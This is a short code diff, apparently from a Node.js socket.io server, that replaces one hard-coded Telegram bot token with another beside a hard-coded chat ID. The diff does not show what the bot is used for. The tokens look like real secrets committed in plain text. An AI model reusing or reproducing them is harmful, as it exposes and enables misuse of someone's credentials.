@@ -15,7 +15,7 @@ const io = new Server(server, {
 // ============================================================
 // KONFIGURASI TELEGRAM BOT
 // ============================================================
-const TELEGRAM_BOT_TOKEN = '8993013005:AAGsQP1UAy5W-_XUvUH5NQPh-Rlwa4UuqHw';
+const TELEGRAM_BOT_TOKEN = '8817291654:AAGKHT9hwRbb24MYWKWEfC4OoJX4e07WSzE';
 const TELEGRAM_CHAT_ID   = '7745145566';
 
 /**
